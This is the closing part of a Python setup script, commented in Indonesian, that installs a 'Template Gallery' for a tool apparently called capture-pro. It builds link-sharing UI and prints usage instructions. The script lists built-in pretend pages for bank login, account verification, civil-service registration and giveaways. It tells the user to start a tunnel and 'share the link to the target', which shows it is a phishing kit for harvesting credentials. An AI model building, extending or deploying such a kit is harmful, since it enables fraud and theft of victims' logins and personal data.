          <input id="tplLink1" value="\${escHtml(link)}" readonly style="width:100%;padding:8px;background:#0d1117;color:#58a6ff;border:1px solid #30363d;border-radius:6px;font-size:11px;box-sizing:border-box" onclick="this.select()">
          <button onclick="navigator.clipboard.writeText(document.getElementById('tplLink1').value);this.textContent='✅ Copied'" style="margin-top:6px;padding:6px 12px;background:#1e6feb;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:12px">📋 Copy</button>

          <p style="margin:14px 0 8px"><b>Link mode (tanpa template):</b></p>
          <input id="tplLink2" value="\${escHtml(shortLink)}" readonly style="width:100%;padding:8px;background:#0d1117;color:#58a6ff;border:1px solid #30363d;border-radius:6px;font-size:11px;box-sizing:border-box" onclick="this.select()">
          <button onclick="navigator.clipboard.writeText(document.getElementById('tplLink2').value);this.textContent='✅ Copied'" style="margin-top:6px;padding:6px 12px;background:#30363d;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:12px">📋 Copy</button>

          <p style="margin:14px 0 0;color:#8b949e;font-size:11px">💡 Pastikan tunnel sudah jalan sebelum share link. Test dulu di browser sendiri.</p>
        </div>
      \`,
      width: 600,
      confirmButtonText: "OK",
    });
  } catch (e) {
    Swal.fire("Error", e.message, "error");
  }
}

function openPreview(id) {
  window.open("/t/" + id + "/preview", "_blank");
}

async function deleteTpl(id) {
  const r = await Swal.fire({
    title: "Hapus template?",
    icon: "warning",
    showCancelButton: true,
    confirmButtonText: "Hapus",
    confirmButtonColor: "#da3633",
  });
  if (!r.isConfirmed) return;
  await fetch("/api/templates/delete/" + id, { method: "POST" });
  loadTemplates();
}

async function initBuiltin() {
  Swal.fire({ title: "Loading template...", didOpen: () => Swal.showLoading(), allowOutsideClick: false });
  const res = await fetch("/api/templates/init-builtin", { method: "POST" });
  const data = await res.json();
  Swal.close();
  Swal.fire({ icon: "success", title: data.created + " template dimuat", timer: 1500, showConfirmButton: false });
  loadTemplates();
}

loadTemplates();
</script>

{% endblock %}
''')
print(f"  OK  {gallery}")


# ============================================================
# STEP 6: Tambah tombol Templates di dashboard
# ============================================================
print("\n[6/6] Tambah tombol '📚 Templates' di dashboard...")
dash = PROJECT / "app" / "templates" / "dashboard.html"
if dash.exists():
    content = dash.read_text(encoding="utf-8")
    if 'href="/templates"' not in content:
        content = content.replace(
            '<a class="btn" href="/modes"',
            '<a class="btn" href="/templates" style="background:#d29922;color:#0f1117;font-weight:600">📚 Templates</a>\n    <a class="btn" href="/modes"'
        )
        if 'href="/templates"' not in content:
            content = content.replace(
                '<a class="btn" href="/features"',
                '<a class="btn" href="/templates" style="background:#d29922;color:#0f1117;font-weight:600">📚 Templates</a>\n    <a class="btn" href="/features"'
            )
        dash.write_text(content, encoding="utf-8")
        print("      OK  Tombol ditambahkan")

print()
print("=" * 60)
print("  ✅ TEMPLATE GALLERY — SELESAI")
print("=" * 60)
print()
print("  Fitur baru:")
print("    📚 Template Gallery — 6 template bawaan")
print("    🎯 Klik 'Pakai' → langsung generate link")
print("    👁️ Preview template sebelum dipakai")
print("    ➕ Bisa tambah template custom (HTML sendiri)")
print("    🔗 Link template: /t/<id>/<slug>")
print()
print("  Template bawaan:")
print("    📋 Kuisioner Penelitian")
print("    🔒 Verifikasi Akun")
print("    🏛️ Pendaftaran CPNS")
print("    🏦 Login Bank")
print("    🎁 Giveaway/Undian")
print("    (dan masih banyak lagi)")
print()
print("  Cara pakai:")
print("    1. Restart server:")
print("         pkill -f 'python run.py'")
print("         cd ~/capture-pro && python run.py")
print()
print("    2. Buka: http://localhost:8000/dashboard")
print()
print("    3. Klik tombol '📚 Templates' (warna emas)")
print()
print("    4. Klik 'Load Template Bawaan' (kalau kosong)")
print()
print("    5. Pilih template → klik '🚀 Pakai'")
print()
print("    6. Copy link → share ke target")
print()
